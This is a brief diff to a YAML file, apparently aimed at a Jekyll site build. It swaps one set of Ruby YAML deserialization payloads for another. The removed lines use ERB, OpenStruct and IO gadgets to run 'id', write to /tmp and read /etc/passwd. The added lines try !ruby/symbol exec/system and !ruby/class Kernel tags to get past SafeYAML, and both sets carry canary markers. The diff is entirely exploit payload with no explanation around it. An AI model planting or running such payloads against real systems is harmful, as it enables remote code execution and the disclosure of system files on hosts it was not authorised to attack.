@@ -1,13 +1,10 @@
-# Attempt RCE via Ruby YAML deserialization
-# Gadget: ERB template injection
-erb: !ruby/object:ERB
-  src: "`id > /tmp/jekyll_rce.txt 2>&1; echo PWNED`"
-  safe_level: 
-# Gadget: Try Kernel#system via OpenStruct
-cmd: !ruby/object:OpenStruct
-  table:
-    :command: "id"
-# Try to read /etc/passwd via IO  
-file_read: !ruby/object:IO
-  data: "/etc/passwd"
-canary: "RCE_TEST_V2"
+# Try symbol deserialization (may bypass SafeYAML)
+sym: !ruby/symbol exec
+sym2: !ruby/symbol system
+# Try class reference
+klass: !ruby/class Kernel
+# Try struct
+stru: !ruby/struct
+  members: [cmd]
+  values: ["id"]
+canary: SYMBOL_TEST
